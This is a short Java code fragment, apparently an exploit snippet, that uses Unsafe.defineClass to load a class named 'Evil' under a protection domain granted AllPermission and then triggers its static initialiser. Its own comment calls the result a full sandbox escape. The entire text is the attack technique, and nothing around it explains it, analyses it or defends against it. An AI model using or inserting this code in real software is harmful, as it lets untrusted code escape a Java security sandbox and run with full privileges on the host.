unsafe.defineClass("Evil", classBytes, 0, classBytes.length, loader,
    new ProtectionDomain(new CodeSource(null, (Certificate[]) null),
        new Permissions() {{ add(new AllPermission()); }}));
Class.forName("Evil"); // trigger static init → full sandbox escape
